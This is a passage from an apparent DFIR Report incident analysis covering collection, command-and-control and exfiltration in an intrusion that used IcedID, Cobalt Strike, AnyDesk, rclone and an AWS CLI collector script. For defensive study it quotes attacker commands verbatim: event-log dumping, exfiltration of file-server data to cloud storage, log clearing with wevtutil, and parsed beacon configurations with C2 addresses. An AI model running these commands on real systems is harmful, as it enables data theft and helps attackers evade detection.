<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Throughout the intrusion, the threat actor accessed several files related to the IT department. Furthermore, the Windows Security events logs were dumped and exfiltrated from a domain controller using PowerShell commands executed from the Cobalt Strike beacon:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">get-eventlog security
get-eventlog security &gt;&gt; ot.txt
compress-archive -path ot.txt -destinationpath ot.zip
get-eventlog security | Out-String 4096 &gt;&gt; full_string.txt
get-eventlog security | Out-String 8192 &gt;&gt; 8.txt
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The threat actor also used 7zip to archive selected groups of files with the somewhat ironic password &#8220;TOPSECRETPASSWORD&#8221;.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-062.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32122" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-062.png" alt="" width="1957" height="511" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-062.png 1957w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-062-300x78.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-062-1024x267.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-062-768x201.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-062-1536x401.png 1536w" sizes="(max-width: 1957px) 100vw, 1957px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>During this intrusion, due to the length of time and network stability, some network artifacts are missing that we would otherwise normally include and there may be gaps in data.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>IcedID</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>IcedID command and control traffic was observed on just the first two days of the intrusion:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-063.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32123" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-063.png" alt="" width="2554" height="438" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-063.png 2554w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-063-300x51.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-063-1024x176.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-063-768x132.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-063-1536x263.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-063-2048x351.png 2048w" sizes="(max-width: 2554px) 100vw, 2554px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Cobalt Strike</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cobalt Strike command and control traffic started on the second day of the intrusion and was observed throughout.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-064.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32124" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-064.png" alt="" width="2550" height="458" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-064.png 2550w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-064-300x54.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-064-1024x184.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-064-768x138.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-064-1536x276.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-064-2048x368.png 2048w" sizes="(max-width: 2550px) 100vw, 2550px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The Cobalt Strike configuration extracted from the PowerShell script previously described shows that the threat actor:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Chose gpupdate.exe as the legitimate Windows process in which to inject the Cobalt Strike shellcode.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Adopted the <a href="https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection" target="_blank" rel="noreferrer noopener">Early Bird APC Queue process injection technique</a> attempting to evade security technologies.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Tried to masquerade Cobalt Strike traffic as connections to <code>cloudfront.amazonaws.com</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Defined three different IP addresses as C2 servers.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Executable Beacon Config parsed by <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py" target="_blank" rel="noreferrer noopener">1768.py</a>:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">payloadType: 0x0000000a
payloadSize: 0x00000000
intxorkey: 0x00000000
id2: 0x00000000
Skipping 32 bytes
payloadType: 0x00002830
payloadSize: 0x00043a03
intxorkey: 0x9a396cda
id2: 0x00016e67
MZ header found position 7
Config found: xorkey b'.' 0x0003e230 0x000439fc
0x0001 payload type                     0x0001 0x0002 8 windows-beacon_https-reverse_https
0x0002 port                             0x0001 0x0002 443
0x0003 sleeptime                        0x0002 0x0004 37500
0x0004 maxgetsize                       0x0002 0x0004 8388737
0x0005 jitter                           0x0001 0x0002 33
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100b0b1b1708875e1ccb5f2d8b2f3917a547ad5789a648ea8c6ce954a2205b545a1ac34e929fe53f89f7135e00e7da54c93ed2bf3cb4aa7de43cff616aae145de4f0f118a997acda5e7708591f3970fa86f8291022fb50a4867d8137b77184c8624a1a50201bc69fad27ba855ae3f49a550ccb696f031b9ef5fbb8efdcec4bafc61020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0x0008 server,get-uri                   0x0003 0x0100 '45.15.161.97,/ws01cs11/g,23.159.160.88,/ws01cs11/g,51.89.133.3,/ws01cs11/g'
0x0043 DNS_STRATEGY                     0x0001 0x0002 0
0x0044 DNS_STRATEGY_ROTATE_SECONDS      0x0002 0x0004 -1
0x0045 DNS_STRATEGY_FAIL_X              0x0002 0x0004 -1
0x0046 DNS_STRATEGY_FAIL_SECONDS        0x0002 0x0004 -1
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\gpupdate.exe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\gpupdate.exe'
0x001f CryptoScheme                     0x0001 0x0002 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 0
0x0025 license-id                       0x0002 0x0004 987654321
0x0024 deprecated                       0x0003 0x0020 'NtZOV6JzDr9QkEnX6bobPg=='
0x0026 bStageCleanup                    0x0001 0x0002 1
0x0027 bCFGCaution                      0x0001 0x0002 1
0x0047 MAX_RETRY_STRATEGY_ATTEMPTS      0x0002 0x0004 0
0x0048 MAX_RETRY_STRATEGY_INCREASE      0x0002 0x0004 0
0x0049 MAX_RETRY_STRATEGY_DURATION      0x0002 0x0004 0
0x0009 useragent                        0x0003 0x0100 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
0x000a post-uri                         0x0003 0x0040 '/ws01cs11/p'
0x000b Malleable_C2_Instructions        0x0003 0x0100
  Transform Input: [7:Input,4,1:9,2:120,8]
   Print
   Remove 9 bytes from end
   Remove 120 bytes from begin
   NETBIOS lowercase
0x000c http_get_header                  0x0003 0x0200
  Const_host_header Host: cloudfront.amazonaws.com
  Const_header Connection: close
  Build Metadata: [7:Metadata,13,6:Authorizaion]
   BASE64 URL
   Header Authorizaion
0x000d http_post_header                 0x0003 0x0200
  Const_host_header Host: cloudfront.amazonaws.com
  Const_header Connection: close
  Build Output: [7:Output,4]
   Print
  Build SessionId: [7:SessionId,13,6:x-amz-id]
   BASE64 URL
   Header x-amz-id
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 0
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x003a TCP_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0039 SMB_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0037 EXIT_FUNK                        0x0001 0x0002 0
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 1
0x002a ObfuscateSectionsInfo            0x0003 0x0028 '\x00à\x02\x002Ú\x03\x00\x00à\x03\x00¨Ò\x04\x00\x00à\x04\x000\x01\x05\x00\x00\x10\x05\x00\x90\x1f\x05'
0x002b process-inject-start-rwx         0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 32 PAGE_EXECUTE_READ
0x002d process-inject-min_alloc         0x0002 0x0004 16700
0x002e process-inject-transform-x86     0x0003 0x0100 '\x00\x00\x00\x03\x90\x90\x90'
0x002f process-inject-transform-x64     0x0003 0x0100 '\x00\x00\x00\x03\x90\x90\x90'
0x0035 process-inject-stub              0x0003 0x0010 'ÌK\xa0\x1c\x07m\x92\\áü3=Yº\x83Û'
0x0033 process-inject-execute           0x0003 0x0080 '\x06\x10\x00\x00\x00\x00\nntdll.dll\x00\x00\x00\x00\x13RtlUserThreadStart\x00\x02\x08\x07\x10\x00\x00\x00\x00\rkernel32.dll\x00\x00\x00\x00\rLoadLibraryA\x00\x03\x04'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0030 DEPRECATED_PROCINJ_ALLOWED       0x0001 0x0002 0
0x0010 killdate_year                    0x0001 0x0002 0
0x004a                                  0x0003 0x0020 '\x87\x05\x1eÅ\x07m\x92D\x92É\nQlÓòê©!ú/H&lt;ös\x92\x9bEs8Ý¾æ'
0x0000
Guessing Cobalt Strike version: 4.4 (max 0x004a)
Sanity check Cobalt Strike config: OK
Sleep mask 64-bit 4.2 deobfuscation routine found: 0x0003c382
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>PowerShell beacon config parsed by <a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noreferrer noopener">SentinelOne script</a>:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">BeaconType                       - HTTPS
Port                             - 443
SleepTime                        - 37500
MaxGetSize                       - 8388737
Jitter                           - 33
MaxDNS                           - Not Found
PublicKey_MD5                    - 06a2e2d6dd645defdac0b2dd719ea441
C2Server                         - 23.159.160.88,/ws01cs10/g,51.89.133.3,/ws01cs10/g
UserAgent                        - Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
HttpPostUri                      - /ws01cs10/p
Malleable_C2_Instructions        - Remove 9 bytes from the end
                                   Remove 120 bytes from the beginning
                                   NetBIOS decode 'a'
HttpGet_Metadata                 - ConstHeaders
                                        Host: cloudfront.amazonaws.com
                                        Connection: close
                                   Metadata
                                        base64url
                                        header "Authorizaion"
HttpPost_Metadata                - ConstHeaders
                                        Host: cloudfront.amazonaws.com
                                        Connection: close
                                   SessionId
                                        base64url
                                        header "x-amz-id"
                                   Output
                                        print
PipeName                         - Not Found
DNS_Idle                         - Not Found
DNS_Sleep                        - Not Found
SSH_Host                         - Not Found
SSH_Port                         - Not Found
SSH_Username                     - Not Found
SSH_Password_Plaintext           - Not Found
SSH_Password_Pubkey              - Not Found
SSH_Banner                       -
HttpGet_Verb                     - GET
HttpPost_Verb                    - POST
HttpPostChunk                    - 0
Spawnto_x86                      - %windir%\syswow64\gpupdate.exe
Spawnto_x64                      - %windir%\sysnative\gpupdate.exe
CryptoScheme                     - 0
Proxy_Config                     - Not Found
Proxy_User                       - Not Found
Proxy_Password                   - Not Found
Proxy_Behavior                   - Use IE settings
Watermark_Hash                   - NtZOV6JzDr9QkEnX6bobPg==
Watermark                        - 987654321
bStageCleanup                    - True
bCFGCaution                      - True
KillDate                         - 0
bProcInject_StartRWX             - True
bProcInject_UseRWX               - False
bProcInject_MinAllocSize         - 16700
ProcInject_PrependAppend_x86     - b'\x90\x90\x90'
                                   Empty
ProcInject_PrependAppend_x64     - b'\x90\x90\x90'
                                   Empty
ProcInject_Execute               - ntdll.dll:RtlUserThreadStart
                                   SetThreadContext
                                   NtQueueApcThread-s
                                   kernel32.dll:LoadLibraryA
                                   CreateRemoteThread
                                   RtlCreateUserThread
ProcInject_AllocationMethod      - VirtualAllocEx
bUsesCookies                     - False
HostHeader                       -
headersToRemove                  - Not Found
DNS_Beaconing                    - Not Found
DNS_get_TypeA                    - Not Found
DNS_get_TypeAAAA                 - Not Found
DNS_get_TypeTXT                  - Not Found
DNS_put_metadata                 - Not Found
DNS_put_output                   - Not Found
DNS_resolver                     - Not Found
DNS_strategy                     - round-robin
DNS_strategy_rotate_seconds      - -1
DNS_strategy_fail_x              - -1
DNS_strategy_fail_seconds        - -1
Retry_Max_Attempts               - 0
Retry_Increase_Attempts          - 0
Retry_Duration                   - 0
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The C2 server values indicate an interesting string which could be used to hunt for further servers abused by the threat actor: <code>ws01cs10</code>. By performing the following search through <a href="https://urlscan.io" target="_blank" rel="noreferrer noopener">urlscan.io</a>, it was possible to identify another potential Cobalt Strike C2 and a Meterpreter ELF beacon named<code>rpcd</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">page.url.keyword:*ws01cs01*
</pre>
<!-- /wp:preformatted -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-065.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32125" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-065.png" alt="" width="2000" height="557" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-065.png 2000w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-065-300x84.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-065-1024x285.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-065-768x214.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-065-1536x428.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://www.virustotal.com/gui/file/f415c7d1b6a19975f2bb09e79f4416975375490fc645865dd63478c8aa605d97/detection" target="_blank" rel="noreferrer noopener">VirusTotal &#8211; File &#8211; f415c7d1b6a19975f2bb09e79f4416975375490fc645865dd63478c8aa605d97</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the VT&#8217;s Communicating Files section, it was possible to identify a BAT file &#8211; uploaded on the 27th of February 2024 &#8211; that communicates with 108.62.123[.]147 and executes the following PowerShell command, clearly to download a Cobalt Strike beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-066.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32126" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-066.png" alt="" width="1476" height="112" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-066.png 1476w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-066-300x23.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-066-1024x78.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-066-768x58.png 768w" sizes="(max-width: 1476px) 100vw, 1476px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>To further masquerade the command and control servers, the threat actor created self-signed certificates by specifying Amazon as the organization on <code>23.159.160[.]88</code> and <code>108.62.123[.]147</code>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-067.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32127" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-067.png" alt="" width="1178" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-067.png 1178w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-067-300x287.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-067-1024x978.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-067-768x733.png 768w" sizes="(max-width: 1178px) 100vw, 1178px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The certificate serial number can also be used to hunt for potential similar Cobalt Strike command and control servers on Fofa.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-068.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32128" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-068.png" alt="" width="1055" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-068.png 1055w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-068-281x300.png 281w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-068-960x1024.png 960w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-068-768x819.png 768w" sizes="(max-width: 1055px) 100vw, 1055px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Anydesk</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Anydesk, first installed on the eighth day of the intrusion, was use sporadically throughout the rest of the intrusion with spikes in command and control traffic throughout. The main use case seem to be when the threat actor wanted to interact with GUI tools like when crafting GPO policies for the domain.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-069.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32129" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-069.png" alt="" width="2554" height="373" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-069.png 2554w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-069-300x44.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-069-1024x150.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-069-768x112.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-069-1536x224.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-069-2048x299.png 2048w" sizes="(max-width: 2554px) 100vw, 2554px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>During the intrusion, the threat actor employed multiple techniques to exfiltrate data from the compromised infrastructure.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Rclone</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The day after initial access, the threat actor started exfiltrating data from the environment. First, the network shares were enumerated and, subsequently, rclone was dropped onto a domain Controller and executed to exfiltrate data from a file server.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C rclone.exe copy "\\[FILE SERVER]\[REDACTED]\" 6666:[REDACTED]/[REDACTED]/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The rclone config file was setup to use several services. Based on the use of 6666 in the command line it looked like the threat actor was attempting to use the <a href="https://www.pcloud.com/" target="_blank" rel="noreferrer noopener">pCloud</a> service.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-070.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32130" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-070.png" alt="" width="1081" height="95" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-070.png 1081w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-070-300x26.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-070-1024x90.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-070-768x67.png 768w" sizes="(max-width: 1081px) 100vw, 1081px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We did not observe significant network traffic to any pCloud endpoints leading us to assess that this exfiltration activity failed, leading to the threat actor pivoting to their other exfiltration tooling and remote endpoint.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>AWSCLI</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the same day that rclone was launched, the AWS CLI was also employed to exfiltrate data from a file server using the Domain Controller.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>"C:\programdata\microsoft\windows\wer\bin\AWSCLIV2\WaAppAgent.exe" s3 cp \\REDACTED\G$\Backupsold s3://REDACTED/REDACTED/G_Backupsold --region us-east-1 --recursive --endpoint-url https://REDACTED.s3-accelerate.amazonaws.com --exclude *.mp4 --exclude *.jpg --exclude *.iso --exclude *.lnk --exclude *.url --exclude *.dll --exclude *.exe --exclude *.chm --exclude *.swf --exclude *.mp3 --exclude *.cab --exclude *.msi --exclude *.wav --exclude *.msi --exclude *.log --exclude *.jpg --exclude *.msu --exclude *.m4a --exclude *.jar --exclude *.wma</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This action was mostly automated by the AWScollector PowerShell script. Therefore, we&#8217;ve documented the general function there.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>AWSCOLLECTOR</strong></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-071.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32131" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-071.png" alt="" width="6000" height="3375" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-071.png 6000w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-071-300x169.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-071-1024x576.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-071-768x432.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-071-1536x864.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-071-2048x1152.png 2048w" sizes="(max-width: 6000px) 100vw, 6000px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The <code>awscollector.ps1</code> script contains roughly 14k lines of PowerShell, which appears to handle all manners of tasks such as running Sharphound, clearing Windows event logs, disabling known AV/EDR, sending telegram updates, exfiltrating data to S3 bucket, performs various host discovery and lateral movements using variety of tools, lots of offensive PowerShell tools, and deploys different variants of ransomware tools such as Revil, Xing, Quantum, Dagon locker, etc.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The author of this script <code>darussian@tutanota[.]com</code> also maintains the version logs whenever they implement any updates and changes started from 2020-08-26 as the earliest version, up to the last updates on 2023-07-27.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-072.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32132" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-072.png" alt="" width="1954" height="2246" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-072.png 1954w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-072-261x300.png 261w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-072-891x1024.png 891w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-072-768x883.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-072-1336x1536.png 1336w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-072-1782x2048.png 1782w" sizes="(max-width: 1954px) 100vw, 1954px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Aside from these main features, the author was also kind enough to provide the list of the modules that are available.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-073.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32133" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-073.png" alt="" width="2176" height="586" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-073.png 2176w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-073-300x81.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-073-1024x276.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-073-768x207.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-073-1536x414.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-073-2048x552.png 2048w" sizes="(max-width: 2176px) 100vw, 2176px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Run Sharphound</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor leveraged the usage of SharpHound as part of the script. SharpHound is part of the BloodHound toolkit, which helps attackers find important targets and weak spots in the Active Directory environment. With the information SharpHound gathers, attackers can figure out how to escalate privileges.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-074.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32134" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-074.png" alt="" width="2410" height="882" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-074.png 2410w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-074-300x110.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-074-1024x375.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-074-768x281.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-074-1536x562.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-074-2048x750.png 2048w" sizes="(max-width: 2410px) 100vw, 2410px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-075.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32135" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-075.png" alt="" width="2440" height="880" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-075.png 2440w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-075-300x108.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-075-1024x369.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-075-768x277.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-075-1536x554.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-075-2048x739.png 2048w" sizes="(max-width: 2440px) 100vw, 2440px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Clear Windows Event Logs</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Part of the script is configured to use the command <code>wevtutil.exe cl</code> to delete Windows event logs, hiding evidence of their actions. This built-in Windows tool helps them stay undetected by removing records of their activities. The script specifically targeted four key Windows Event Log channels: Windows PowerShell, Application, Security, and System Logs.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-076.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32136" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-076.png" alt="" width="2356" height="202" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-076.png 2356w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-076-300x26.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-076-1024x88.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-076-768x66.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-076-1536x132.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-076-2048x176.png 2048w" sizes="(max-width: 2356px) 100vw, 2356px" /></a></p>
